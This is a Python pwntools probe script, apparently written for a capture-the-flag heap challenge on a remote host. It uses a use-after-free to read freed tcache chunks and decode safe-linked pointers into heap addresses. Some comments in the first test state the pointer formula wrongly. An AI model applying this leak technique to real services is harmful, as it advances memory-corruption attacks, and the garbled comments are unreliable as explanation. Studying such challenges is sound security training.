#!/usr/bin/env python3
"""Probe to understand tcache chain - create multiple, then banish all"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')

# Create 3 spells (they go to consecutive addresses on the heap)
# Then banish in reverse order to build tcache chain
print("[*] Creating 3 spells")
create(p, 0, 0x80, b'A' * 0x10 + b'\n')
create(p, 1, 0x80, b'B' * 0x10 + b'\n')
create(p, 2, 0x80, b'C' * 0x10 + b'\n')

# Banish in reverse order: 2, 1, 0
# tcache: [] -> [2] -> [1, 2] -> [0, 1, 2]
print("[*] Banishing 2, 1, 0")
banish(p, 2)
banish(p, 1)
banish(p, 0)

# Now read UAF on each
# spell 0: fd = (0>>12) ^ spell1 = protected ptr to spell1
# spell 1: fd = (1>>12) ^ spell2 = protected ptr to spell2
# spell 2: fd = (2>>12) ^ 0 = 2>>12 (since tcache was empty)
for idx in [2, 1, 0]:
    data = recite(p, idx, 0x80)
    fd = u64(data[0:8])
    key = u64(data[8:16])
    addr_from_fd = fd << 12
    print(f"  spell {idx}: fd={hex(fd)}, addr_from_fd={hex(addr_from_fd)}, key={hex(key)}")

# spell 2 was freed first (tcache empty), so fd = addr2>>12
# spell 2 addr = fd << 12
addr2 = fd << 12
print(f"\n  spell 2 addr = {hex(addr2)}")

# spell 1 was freed second, so fd = (addr1>>12) ^ addr2
# We need to read spell 1's fd to get this
# But we already read it above - let me restructure

p.close()

# Second connection for cleaner test
print("\n=== Second test ===")
p = connect()
p.recvuntil(b'> ')

# Create 3 spells
create(p, 0, 0x80, b'A' * 0x10 + b'\n')
create(p, 1, 0x80, b'B' * 0x10 + b'\n')
create(p, 2, 0x80, b'C' * 0x10 + b'\n')

# Banish in order: 0, 1, 2
banish(p, 0)
banish(p, 1)
banish(p, 2)

# Read spell 2 first (it was freed last, tcache head)
# spell 2: fd = (addr2>>12) ^ addr1
# spell 1: fd = (addr1>>12) ^ addr0
# spell 0: fd = (addr0>>12) ^ 0 = addr0>>12 (freed first, tcache was empty)

data0 = recite(p, 0, 0x80)
fd0 = u64(data0[0:8])
addr0 = fd0 << 12
print(f"  spell 0 (freed first): fd={hex(fd0)}, addr={hex(addr0)}")

data1 = recite(p, 1, 0x80)
fd1 = u64(data1[0:8])
print(f"  spell 1 (freed second): fd={hex(fd1)}")
# fd1 = (addr1>>12) ^ addr0
# addr1>>12 = fd1 ^ addr0
addr1 = (fd1 ^ addr0) << 12
print(f"  spell 1 addr (calculated) = {hex(addr1)}")
print(f"  diff addr1-addr0 = {hex(addr1 - addr0)}")

data2 = recite(p, 2, 0x80)
fd2 = u64(data2[0:8])
print(f"  spell 2 (freed third): fd={hex(fd2)}")
# fd2 = (addr2>>12) ^ addr1
addr2 = (fd2 ^ addr1) << 12
print(f"  spell 2 addr (calculated) = {hex(addr2)}")
print(f"  diff addr2-addr1 = {hex(addr2 - addr1)}")

# Expected: diff should be 0x90 (chunk size for 0x80 allocation)
# If diff is not 0x90, there are other allocations between them

p.sendline(b'0')
p.close()
